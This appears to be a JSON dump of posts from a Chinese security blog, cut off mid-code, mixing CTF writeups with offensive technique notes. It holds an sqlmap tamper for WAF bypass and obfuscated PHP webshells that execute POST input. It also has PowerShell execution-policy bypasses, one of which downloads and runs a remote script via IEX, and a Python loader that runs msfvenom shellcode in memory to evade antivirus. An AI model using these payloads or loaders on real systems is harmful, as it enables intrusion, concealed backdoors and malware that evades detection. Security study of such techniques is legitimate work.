1GQ3DGMJWGEZTSNKGGY4TOMZVIY2DSMZVGYZTMMZVIY2UCNCGGZBTGOBVIY2DOMZTGU2DKMBTGAZTCNCFGU2A==== base32 1463161395F69735F493563635F5A4F6C385F4733545030314E54 hex F1a9_is_I5cc_ZOl8_G3TP01NT 暴力XX不可取zip 文件 猜测为伪加密 ZipCenOp.jar 解压后打开 flag.txt vfppjrnerpbzvat 凯撒移位 每一对都试一遍 isccwearecoming 13 次移位","categories":[{"name":"ctf","slug":"ctf","permalink":"https://exp10it.cn/categories/ctf/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://exp10it.cn/tags/writeup/"},{"name":"misc","slug":"misc","permalink":"https://exp10it.cn/tags/misc/"}]},{"title":"ChaBug Web2 WriteUp","slug":"chabug-web2-writeup","date":"2018-05-15T16:00:00.000Z","updated":"2018-08-02T03:04:31.365Z","comments":true,"path":"2018/05/16/chabug-web2-writeup/","link":"","permalink":"https://exp10it.cn/2018/05/16/chabug-web2-writeup/","excerpt":"","text":"题目主要为 PHP 伪随机数种子爆破. 详情请看 白帽子讲 Web 安全 伪随机数安全 index header 有 seed 范围, login csrf_token base64 decode 后就能看到随机数. web2-writeup.docx web2.zip","categories":[{"name":"ctf","slug":"ctf","permalink":"https://exp10it.cn/categories/ctf/"}],"tags":[{"name":"php","slug":"php","permalink":"https://exp10it.cn/tags/php/"},{"name":"writeup","slug":"writeup","permalink":"https://exp10it.cn/tags/writeup/"}]},{"title":"ldap 学习笔记","slug":"ldap-study-note","date":"2018-05-13T16:00:00.000Z","updated":"2018-08-02T03:04:27.781Z","comments":true,"path":"2018/05/14/ldap-study-note/","link":"","permalink":"https://exp10it.cn/2018/05/14/ldap-study-note/","excerpt":"LDAP: Lightweight Directory Access Protocol 轻量级目录访问协议. ldap 用树状结构存储数据, 类似于电话簿, 也能作为类似于 windows 的域环境. Microsoft Active Directory 为 LDAP 的具体实现.","text":"LDAP: Lightweight Directory Access Protocol 轻量级目录访问协议. ldap 用树状结构存储数据, 类似于电话簿, 也能作为类似于 windows 的域环境. Microsoft Active Directory 为 LDAP 的具体实现. 概念在 ldap 中, 每一条数据都是由 dn 组成的. dn: 数据唯一标识符 由于树状结构, 排在最上面的根就叫 基准 dn. 基准 dn: 树状结构的最顶部 123dc=domain,dc=comou=hr,dc=domain,dc=comuid=Alice,ou=hr,dc=domain,dc=com 其中 dc=domain,dc=com 为基准 dn. 像 dc ou uid 这些叫作 dn 的属性. 123456cn - 常用名称dc - 域名成分o - 组织名称ou - 组织单位uid - 用户标识sn - 用户姓 dc 为公司域名, o 可作为公司名称, ou 则为公司里的部门, cn 为一些管理账户的名称 (例如 ldap manager 的登录名). 其他属性 1234567C - 国家名称ST - 州/省名L - 地名STREET - 街道地址givenName - 用户名mail - 邮箱地址telephoneNumber - 电话号码 在 ldap 中 属性不区分大小写 objectClassobjectClass 可理解为 dn 的模板, 如 person 类包含 telephoneName sn givenName 等属性. 分类 结构型: 如 person organizationUnit辅助型: 如 extensibeObject抽象型: 如 top 1234567891011121314accountaliasdcobjectdomainipHostorganizationorganizationalRoleorganizationalUnitpersonorganizationalPersoninetOrgPersonresidentialPersonposixAccountposixGroup 其中每个类必需设置的属性 12345678account: useridorganization: operson: cn snorganizationalPerson: same personorganizationalRole: cnorganizationUnit: ouposixGroup: cn gidNumberposixAccount: cn gidNumber homeDirectory uid uidNumber openldap 官网上没找到详细的资料, 不过 classObject 的详细内容可以在 ApacheDirectoryStudio 中看到. openldap常用命令 12345ldapaddldapsearchldapmodifyldapdeleteslapcat ldapadd添加数据 12345-x 进行简单认证-D 服务器 dn-h 目录服务的地址-w dn 密码-f 使用 LDIF 添加条目 ldapadd -x -D &quot;cn=root,dc=domain,dc=com&quot; -w root ldapsearch查找数据 12345-x 进行简单认证-D 服务器 dn-w dn 密码-b 要查询的根节点-H 要查询的服务器 ldapsearch -x -D &quot;cn=root,dc=domain,dc=com&quot; -w root -b &quot;dc=domain,dc=com&quot; ldapmodify修改数据 12345-x 进行简单认证-D 服务器 dn-h 目录服务的地址-w dn 密码-f 使用 LDIF 修改条目 格式 1234dn: cn=test, ou=managers, dc=dlw, dc=com changetype: modifyreplace: snsn: Test User Modify ldapdelete1234-x 进行简单认证-D 服务器 dn-h 目录服务的地址-w dn 密码 ldapdelete -x -D &quot;cn=root,dc=domain,dc=com&quot; -w root &quot;uid=Alice,ou=hr,dc=domain,dc=com&quot; slapcat导出数据 1slapcat -l export.ldif Other当使用 ldap 交互式操作时, 需通过 Ctrl+D 提交数据.","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/tags/note/"},{"name":"ldap","slug":"ldap","permalink":"https://exp10it.cn/tags/ldap/"}]},{"title":"php Object Inject","slug":"php-object-inject","date":"2018-05-12T16:00:00.000Z","updated":"2018-08-02T03:04:19.957Z","comments":true,"path":"2018/05/13/php-object-inject/","link":"","permalink":"https://exp10it.cn/2018/05/13/php-object-inject/","excerpt":"序列化 (serialize) 指将 PHP 变量/数组/函数/类 转换为可保存或传输的过程, 再通过反序列化 (unserialize) 转换为原来的数据使用. 关于反序列化 有 3 个魔术方法. 123__destruct - 程序结束时调用__wakeup - 类被反序列化时调用__toString - 类被作为字符串时调用","text":"序列化 (serialize) 指将 PHP 变量/数组/函数/类 转换为可保存或传输的过程, 再通过反序列化 (unserialize) 转换为原来的数据使用. 关于反序列化 有 3 个魔术方法. 123__destruct - 程序结束时调用__wakeup - 类被反序列化时调用__toString - 类被作为字符串时调用 Example1123456class Test&#123; var $name = &apos;hello&apos;; public function __destruct()&#123; echo $this-&gt;name; &#125;&#125; 该类实例化后将在程序结束时打印出 name 的值. 更改 name 的值, 之后序列化. 123$test = new Test();$test-&gt;name = &apos;world&apos;;echo serialize($test); 1O:4:&quot;Test&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;world&quot;;&#125; 反序列化.1$u = unserialize(&apos;O:4:&quot;Test&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;world&quot;;&#125;&apos;); 1world Example212345678910111213141516171819202122class FileClass&#123; var $filename; var $content; public function __construct($filename,$content)&#123; $this-&gt;filename = $filename; $this-&gt;content = $content; &#125; public function write($content)&#123; file_put_contents($this-&gt;filename,$content); &#125; public function __destruct()&#123; echo &apos;clean file&apos;.$this-&gt;filename; @unlink($this-&gt;filename); &#125;&#125;$u = unserialize($_GET[&apos;u&apos;]);?&gt; 利用. 1234class FileClass&#123; var $filename = &apos;install.lock&apos;;&#125;echo serialize(new FileClass()); GET 传递 O:9:&quot;FileClass&quot;:1:{s:8:&quot;filename&quot;;s:12:&quot;install.lock&quot;;} 1clean file install.lock Other参考 Typecho install.php 反序列化漏洞 https://paper.seebug.org/424/","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"php","slug":"php","permalink":"https://exp10it.cn/tags/php/"}]},{"title":"sqlmap tamper 编写","slug":"sqlmap-tamper-coding","date":"2018-05-11T16:00:00.000Z","updated":"2018-08-02T03:04:17.349Z","comments":true,"path":"2018/05/12/sqlmap-tamper-coding/","link":"","permalink":"https://exp10it.cn/2018/05/12/sqlmap-tamper-coding/","excerpt":"sqlmap 是一个开源的渗透测试工具, 可以用来自动化的检测, 利用 SQL 注入漏洞, 获取数据库服务器的权限. 在 sqlmap 的 tamper 中, 需要实现的地方有 3 处. 123__priority__ - 脚本优先级dependencies - 适用/不适用的范围tamper - 用于 bypass waf","text":"sqlmap 是一个开源的渗透测试工具, 可以用来自动化的检测, 利用 SQL 注入漏洞, 获取数据库服务器的权限. 在 sqlmap 的 tamper 中, 需要实现的地方有 3 处. 123__priority__ - 脚本优先级dependencies - 适用/不适用的范围tamper - 用于 bypass waf dependencies 一般不用设置, __priority__ 默认为 PRIORITY.LOW 即可 bypass拿之前遇到的 waf 举个例子 1234567891011import randomfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef tamper(payload, **kwargs): fuzz = (&apos;0&apos;,&apos;1&apos;,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;) for _ in range(len(payload.split(&apos; &apos;))-1): string = r&apos;%&apos; + random.choice(fuzz) + random.choice(fuzz) payload.replace(&apos; &apos;,string,1) return payload Otherkwargs 更改 header 12headers = kwargs.get(&apos;headers&apos;, &#123;&#125;)headers[&apos;Referer&apos;] = &apos;http://www.baidu.com/&apos;","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/tags/bypass/"},{"name":"python","slug":"python","permalink":"https://exp10it.cn/tags/python/"}]},{"title":"PHP PDO 参数化查询","slug":"php-pdo-prevent-sql-inject","date":"2018-05-11T16:00:00.000Z","updated":"2018-08-02T03:04:13.965Z","comments":true,"path":"2018/05/12/php-pdo-prevent-sql-inject/","link":"","permalink":"https://exp10it.cn/2018/05/12/php-pdo-prevent-sql-inject/","excerpt":"PHP 数据对象 (PDO) 扩展为 PHP 访问数据库定义了一个轻量级的一致接口. 123456789101112mysql&gt; PREPARE statement FROM &apos;SELECT * FROM user WHERE username = ?&apos;;Query OK, 0 rows affected (0.00 sec)Statement preparedmysql&gt; SET @username = &apos;admin&apos;;Query OK, 0 rows affected (0.00 sec)mysql&gt; EXECUTE statement USING @username;+----------+----------+| username | password |+----------+----------+| admin | 123456 |+----------+----------+1 row in set (0.00 sec)","text":"PHP 数据对象 (PDO) 扩展为 PHP 访问数据库定义了一个轻量级的一致接口. 123456789101112mysql&gt; PREPARE statement FROM &apos;SELECT * FROM user WHERE username = ?&apos;;Query OK, 0 rows affected (0.00 sec)Statement preparedmysql&gt; SET @username = &apos;admin&apos;;Query OK, 0 rows affected (0.00 sec)mysql&gt; EXECUTE statement USING @username;+----------+----------+| username | password |+----------+----------+| admin | 123456 |+----------+----------+1 row in set (0.00 sec) 我们暂时不讨论如何用 PDO 预防 SQL 注入. 先来看看 MYSQL 的预处理与参数化. MYSQLmysql 的预处理语句暂且可以理解为 模板. 创建了 SQL 语句之后, 后面再次进行查询, 只需要将相应的参数重新赋值即可, 不需要再重写一遍语句. 这一切都是在 mysql 服务器中进行的 也就是说, 什么引号之类的, 在 PHP 中不用管, 直接拼接即可, 将后续的转义、过滤操作全部交给 mysql. 由于 SET @variable = param 不能像 where 一样在后面跟上运算符 (= &lt; &gt; like between), 所以也就避免了 SQL 注入. 预处理语句的创建: 123PREPARE [NAME] FROM [SQL Query];SET @variable = [param];EXECUTE [NAME] USING @variable; 其中在 PREPARE 中的参数要替换为 ? 即将 SELECT * FROM user WHERE username = &#39;admin&#39;; 替换为 SELECT * FROM user WHERE username = ?&#39;; EXECUTE 中 USING 后面的变量与语句中的 ? 一一对应. PDO在 PDO 中提供了 prepare() 方法用于实现参数化查询. 123456$pdo = new PDO(&apos;mysql:host=127.0.0.1;dbname=test&apos;,&apos;root&apos;,&apos;root&apos;);$sql = &apos;SELECT * FROM user WHERE username=:username&apos;;$statement = $pdo-&gt;prepare($sql);$statement-&gt;bindParam(&quot;:username&quot;, $username);$statement-&gt;execute();$row = $statement-&gt;fetch(); 和 mysql 不同的是, ? 变成了 :variable, 以便后面用 bindParam 添加参数. 需要注意的是 , PDO 默认在本地模拟拼接 SQL 语句, 最终到 mysql 上时只有一条查询. 通过 $pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); 让 PDO 将语句转到 mysql 拼接. 本地测试了一下, windows 无效, linux 有效, 即使不设置 ATTR_EMULATE_PREPARES 也能避免注入.","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"php","slug":"php","permalink":"https://exp10it.cn/tags/php/"}]},{"title":"python weakfilescan","slug":"python-weakfilescan","date":"2018-05-04T16:00:00.000Z","updated":"2018-08-02T03:04:08.309Z","comments":true,"path":"2018/05/05/python-weakfilescan/","link":"","permalink":"https://exp10it.cn/2018/05/05/python-weakfilescan/","excerpt":"WeakFileScan 是基于 Python 的网站备份检测脚本. Python 3.6 12集成常见的文件名 如 web www wwwroot backup back data支持多种压缩格式 如 rar zip tar.gz tar.bz2 tar.xz 7z","text":"WeakFileScan 是基于 Python 的网站备份检测脚本. Python 3.6 12集成常见的文件名 如 web www wwwroot backup back data支持多种压缩格式 如 rar zip tar.gz tar.bz2 tar.xz 7z Usage123-u 目标 url (需加 http)-t 线程数 (默认为 2)-a 输出详细信息 Output1234562018-05-05 12:26:05,596 - INFO - GET http://www.xxx.com/www.zip2018-05-05 12:26:05,757 - INFO - GET http://www.xxx.com/www.tar.gz2018-05-05 12:26:06,047 - INFO - GET http://www.xxx.com/xxx.rar2018-05-05 12:26:06,092 - INFO - GET http://www.xxx.com/xxx.zip2018-05-05 12:26:06,175 - INFO - GET http://www.bj-bhy.com/xxx.tar.gz2018-05-05 12:26:17,716 - WARNING - FOUND http://www.xxx.com/www.xxx.com.tar.gz Code垃圾脚本还用着到放到 Github? 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from urllib import parseimport threadingimport argparseimport requestsimport loggingimport queueparser = argparse.ArgumentParser()parser.add_argument(&apos;url&apos;,help=&apos;Target url&apos;)parser.add_argument(&apos;-t&apos;,help=&apos;Thread number&apos;,type=int,default=2)parser.add_argument(&apos;-a&apos;,help=&apos;Show all message&apos;,action=&apos;store_const&apos;,const=logging.INFO,default=logging.WARNING)args = parser.parse_args()logging.basicConfig(level=args.a,format=&apos;%(asctime)s - %(levelname)s - %(message)s&apos;)class WeakFileScan(object): def __init__(self,url,threads): self.url = url self.threads = threads self.queue = queue.Queue() self.headers = &#123;&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36&apos;,&apos;X-Forwarded-For&apos;:&apos;127.0.0.1&apos;&#125; def run(self): for item in self._dict(): self.queue.put(item) for _ in range(self.threads): t = threading.Thread(target=self._request) t.start() t.join() def _request(self): while not self.queue.empty(): url = self.queue.get() logging.info(&apos;GET &#123;0&#125;&apos;.format(url)) resp = requests.head(url,headers=self.headers) if resp.status_code == 200: logging.warning(&apos;FOUND &#123;0&#125;&apos;.format(url)) def _parse(self,url): obj = parse.urlparse(url) return obj.netloc def _join(self,*args): obj = parse.urljoin(*args) return obj def _dict(self): url = self._parse(self.url) a = (&apos;bak&apos;,&apos;backup&apos;,&apos;www&apos;,&apos;web&apos;,&apos;wwwroot&apos;,&apos;beifen&apos;,&apos;ftp&apos;,&apos;website&apos;,&apos;back&apos;,&apos;backupdata&apos;,&apos;temp&apos;,&apos;htdocs&apos;,&apos;database&apos;,&apos;data&apos;,&apos;user&apos;,&apos;admin&apos;,&apos;test&apos;,&apos;conf&apos;,&apos;config&apos;,&apos;db&apos;,&apos;sql&apos;,&apos;install&apos;,&apos;w&apos;,&apos;bf&apos;,&apos;aaa&apos;,&apos;0&apos;,&apos;1&apos;,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;) b = (url,url.replace(&apos;.&apos;,&apos;&apos;),url.split(&apos;.&apos;,1)[1],url.split(&apos;.&apos;,1)[0],url.split(&apos;.&apos;)[1],url.split(&apos;.&apos;)[-1]) c = (&apos;.rar&apos;,&apos;.zip&apos;,&apos;.tar&apos;,&apos;.tar.gz&apos;,&apos;.tar.bz2&apos;,&apos;.tar.xz&apos;,&apos;.gz&apos;,&apos;.bz2&apos;,&apos;.xz&apos;,&apos;.tgz&apos;,&apos;.7z&apos;,&apos;.z&apos;) for x in a+b: for y in c: yield self._join(self.url,x+y)Scanner = WeakFileScan(args.url,args.t)Scanner.run()","categories":[{"name":"tools","slug":"tools","permalink":"https://exp10it.cn/categories/tools/"}],"tags":[{"name":"python","slug":"python","permalink":"https://exp10it.cn/tags/python/"}]},{"title":"php shell without alphanum","slug":"php-webshell-without-alphanum","date":"2018-05-04T16:00:00.000Z","updated":"2018-08-02T03:04:04.757Z","comments":true,"path":"2018/05/05/php-webshell-without-alphanum/","link":"","permalink":"https://exp10it.cn/2018/05/05/php-webshell-without-alphanum/","excerpt":"在处理字符变量的算数运算时, PHP 沿袭了 Perl 的习惯. 例如, a = ‘Z’; a++; 将把 $a 变成’AA’, 注意字符变量只能递增, 不能递减, 并且只支持纯字母 (a-z 和 A-Z). php 弱类型的坑. 参考 P 牛的文章, 自己整理一下.","text":"在处理字符变量的算数运算时, PHP 沿袭了 Perl 的习惯. 例如, a = ‘Z’; a++; 将把 $a 变成’AA’, 注意字符变量只能递增, 不能递减, 并且只支持纯字母 (a-z 和 A-Z). php 弱类型的坑. 参考 P 牛的文章, 自己整理一下. ASCII利用之前介绍的特性. 首先要有一个字母 A, 之后才能通过递增得到其它字母. 由于 php 弱类型的特性, array 转换为 string 时会得到 Array. 12$_ = &apos;&apos;.[];echo $_; // Array 通过 ! 进行非运算, bool 类型强制转换就会变成 0 or 1. 1234echo &apos;&apos;; //echo !(&apos;&apos;); // 1echo (&apos;!&apos;==&apos;@&apos;) //echo !(&apos;!&apos;==&apos;@&apos;); // 1 获取字符 A. 12$_ = &apos;&apos;.[];echo $_[&apos;&apos;]; 之后通过递增获取其它字符. 1234567891011121314151617181920212223242526272829$_ = &apos;&apos;.[];$_ = $_[&apos;&apos;];$_; // A$___ = $_;$__ = $_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$___ .= $__.$__;$__ = $_;$__++;$__++;$__++;$__++; // E$___ .= $__;$__ = $_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___ .= $__;$__ = $_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___ .= $__; // ASSERT$____ = &apos;_&apos变量覆盖 得到 $_POST. 1$_ = $$____; // $_POST 拼接. 1$___($_[_]); // ASSERT($_POST[_]) php 不区分大小写. Xor 在PHP中, 两个变量进行异或时, 会将字符串转换成二进制再进行异或. 异或. 两个 foreach 跑出异或结果, 之后拼接. 123456789&lt;?php@$_++; // 1$__=(&quot;#&quot;^&quot;|&quot;); // _$__.=(&quot;.&quot;^&quot;~&quot;); // _P$__.=(&quot;/&quot;^&quot;`&quot;); // _PO$__.=(&quot;|&quot;^&quot;/&quot;); // _POS$__.=(&quot;&#123;&quot;^&quot;/&quot;); // _POST $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1])?&gt;","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"php","slug":"php","permalink":"https://exp10it.cn/tags/php/"},{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/tags/bypass/"}]},{"title":"powershell execution bypass","slug":"powershell-execution-bypass","date":"2018-05-03T16:00:00.000Z","updated":"2018-08-02T03:04:01.753Z","comments":true,"path":"2018/05/04/powershell-execution-bypass/","link":"","permalink":"https://exp10it.cn/2018/05/04/powershell-execution-bypass/","excerpt":"PowerShell execution policy 是用来决定哪些类型的 PowerShell 代码可以在系统中运行. 1234Restricted - 不允许任何脚本运行AllSigned - 只能允许经过数字签名的脚本RemoteSigned - 运行本地脚本不需要数字签名 远程的需要Unrestricted - 允许任何脚本运行 用 Get-ExecutionPolicy 查看当前的策略. 12PS C:\\Users\\46224\\Desktop&gt; Get-ExecutionPolicyRestricted","text":"PowerShell execution policy 是用来决定哪些类型的 PowerShell 代码可以在系统中运行. 1234Restricted - 不允许任何脚本运行AllSigned - 只能允许经过数字签名的脚本RemoteSigned - 运行本地脚本不需要数字签名 远程的需要Unrestricted - 允许任何脚本运行 用 Get-ExecutionPolicy 查看当前的策略. 12PS C:\\Users\\46224\\Desktop&gt; Get-ExecutionPolicyRestricted Bypass将 ExecutionPolicy 设置为 Bypass 绕过策略限制. 12PS C:\\Users\\46224\\Desktop&gt; powershell.exe -ExecutionPolicy Bypass -File .\\test.ps1hello world UnRestricted将 ExecutionPolicy 设置为 UnRestricted 更改策略. 12PS C:\\Users\\46224\\Desktop&gt; PowerShell.exe -ExecutionPolicy UnRestricted -File .\\test.ps1hello world RemoteSigned将 ExecutionPolicy 设置为 RemoteSigned 更改策略. 12PS C:\\Users\\46224\\Desktop&gt; PowerShell.exe -ExecutionPolicy RemoteSigned -File .\\test.ps1hello world Pipe通过管道执行脚本. 12PS C:\\Users\\46224\\Desktop&gt; Get-Content .\\test.ps1 | powershell.exe -hello world 类似的还有 type 命令. 12PS C:\\Users\\46224\\Desktop&gt; type .\\test.ps1 | powershell.exe -hello world IEX通过 IEX 远程下载脚本执行 不受策略限制. 12PS C:\\Users\\46224\\Desktop&gt; powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://xss1.ga/test.ps1&apos;)&quot;hello world Encodeunicode + base64 编码执行. 12345PS C:\\Users\\46224\\Desktop&gt; $command = Get-Content .\\test.ps1PS C:\\Users\\46224\\Desktop&gt; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)PS C:\\Users\\46224\\Desktop&gt; $encodedCommand = [Convert]::ToBase64String($bytes)PS C:\\Users\\46224\\Desktop&gt; powershell.exe -EncodedCommand $encodedCommandhello world Command好像会有引号的转义问题, 更改了下执行的脚本. 1234PS C:\\Users\\46224\\Desktop&gt; echo &quot;echo &apos;hello world&apos;&quot; &gt; .\\test.ps1PS C:\\Users\\46224\\Desktop&gt; $command = Get-Content .\\test.ps1PS C:\\Users\\46224\\Desktop&gt; powershell -command &quot;$command&quot;hello world Invoke-ExpressionInvoke-Expression 将它接受到的任何字符串当作 powershell 代码执行. 12PS C:\\Users\\46224\\Desktop&gt; Get-Content .\\test.ps1 | Invoke-Expressionhello world","categories":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/categories/bypass/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/tags/bypass/"},{"name":"powershell","slug":"powershell","permalink":"https://exp10it.cn/tags/powershell/"}]},{"title":"msf shellcode bypass","slug":"msf-shellcode-bypass","date":"2018-05-02T16:00:00.000Z","updated":"2018-08-02T03:03:54.629Z","comments":true,"path":"2018/05/03/msf-shellcode-bypass/","link":"","permalink":"https://exp10it.cn/2018/05/03/msf-shellcode-bypass/","excerpt":"利用 Python 在内存中执行 ShellCode, 经过 Pynstaller 的封装达到免杀的效果. 在 Freebuf 看各种 APT 分析的时候总能找到 “不落地” “内存执行” 之类的字词, 无奈 C++ 不会, 只能用 Python. 至于 C++ 里面的 windows api, 可以用 ctypes 库来实现. Functions一些在 windows 中进行内存操作的函数 ctypes 中的 windows api 调用格式为 ctypes.windll.kernel32.xxx","text":"利用 Python 在内存中执行 ShellCode, 经过 Pynstaller 的封装达到免杀的效果. 在 Freebuf 看各种 APT 分析的时候总能找到 “不落地” “内存执行” 之类的字词, 无奈 C++ 不会, 只能用 Python. 至于 C++ 里面的 windows api, 可以用 ctypes 库来实现. Functions一些在 windows 中进行内存操作的函数 ctypes 中的 windows api 调用格式为 ctypes.windll.kernel32.xxx VirtualAlloc申请内存地址 声明 123456LPVOID VirtualAlloc&#123;LPVOID lpAddress,DWORD dwSize,DWORD flAllocationType,DWORD flProtect&#125;; 1234lpAddress 分配的内存区域地址dwSite 分配大小flAllocationType 分配类型flProtect 初始保护属性 flAllocationType 这里设为 0x1000, 申请内存并初始化. flProtect 则为 0x40, 即可执行, 可读写. RtllMoveMemory将内容复制到指定的内存地址 声明 12345VOID RtlMoveMemory(VOID UNALIGNED *Destination,const VOID UNALIGNED *Source,SIZE_T Length); 123Destination 目的地址的指针Source 数据Length 长度 Destination 就是之前申请内存地址的引用. CreateThread创建线程 声明 12345678HANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId) 123456lpThreadAttributes 定义新线程的安全属性 默认为 0dwStackSize 线程堆栈大小 默认为 0lpStartAddress 指向线程函数地址 (具体执行的代码)lpParameter 传递给线程函数的参数 默认为 0dwCreationFlags 线程运行状态 0 为立即执行lpThreadId 线程 ID 编号 lpStartAddress 仍为之前申请内存地址的引用. WaitForSingleObject监听 handle 状态 声明 1234DWORD WaitForSingleObject(HANDLE hHandle,DWORD dwMilliseconds); 12hHandle 对象句柄dwMilliseconds 定时时间间隔 指定为非零值表示一直等待直到 Handle 触发 . hHandle 为之前创建线程函数的引用. Other1234from_buffer_copy 解码 shellcodec_int C++ 的 int 类型c_char C++ 的 char 类型pointer C++ 的 指针 Coding首先引入 ctypes 库. 1import ctypes 生成 shellcode 这里执行 win 自带的命令 winver. msfvenom -p windows/exec CMD=winver -f c 返回结果. unsigned char shellcode[]=&#39;xxxx&#39; 整理 shellcode 123456789101112131415shellcode = b&quot;&quot;shellcode = shellcode + b&quot;\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30&quot;shellcode = shellcode + b&quot;\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff&quot;shellcode = shellcode + b&quot;\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2&quot;shellcode = shellcode + b&quot;\\xf0\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0\\x8b\\x40\\x78\\x85&quot;shellcode = shellcode + b&quot;\\xc0\\x74\\x4a\\x01\\xd0\\x50\\x8b\\x48\\x18\\x8b\\x58\\x20\\x01\\xd3\\xe3&quot;shellcode = shellcode + b&quot;\\x3c\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\x31\\xc0\\xac\\xc1\\xcf\\x0d&quot;shellcode = shellcode + b&quot;\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe2\\x58&quot;shellcode = shellcode + b&quot;\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b&quot;shellcode = shellcode + b&quot;\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff&quot;shellcode = shellcode + b&quot;\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xeb\\x86\\x5d\\x6a\\x01\\x8d\\x85\\xb9\\x00&quot;shellcode = shellcode + b&quot;\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56&quot;shellcode = shellcode + b&quot;\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75&quot;shellcode = shellcode + b&quot;\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\\x77\\x69\\x6e\\x76&quot;shellcode = shellcode + b&quot;\\x65\\x72\\x00&quot; 申请内存地址 1ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40)) 如果你还不明白 请回头看上面的 Functions. 解码 shellcode 1buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode) C++ 中没有 string 类型 所以只能用 char * Length 的方式保存字符串. 复制到指定内存地址 1ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode))) 这里对 ptr 进行了 C++ int, 因为引用是 Python 变量, 而 Python 是动态语言, 所以要进行类型转换. 下面的也一样. 创建线程 1ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))) 监听 handle 状态 1ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1)) 全部代码 1234567891011121314151617181920212223#!/usr/bin/pythonimport ctypesshellcode = b&quot;&quot;shellcode = shellcode + b&quot;\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30&quot;shellcode = shellcode + b&quot;\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff&quot;shellcode = shellcode + b&quot;\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2&quot;shellcode = shellcode + b&quot;\\xf0\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0\\x8b\\x40\\x78\\x85&quot;shellcode = shellcode + b&quot;\\xc0\\x74\\x4a\\x01\\xd0\\x50\\x8b\\x48\\x18\\x8b\\x58\\x20\\x01\\xd3\\xe3&quot;shellcode = shellcode + b&quot;\\x3c\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\x31\\xc0\\xac\\xc1\\xcf\\x0d&quot;shellcode = shellcode + 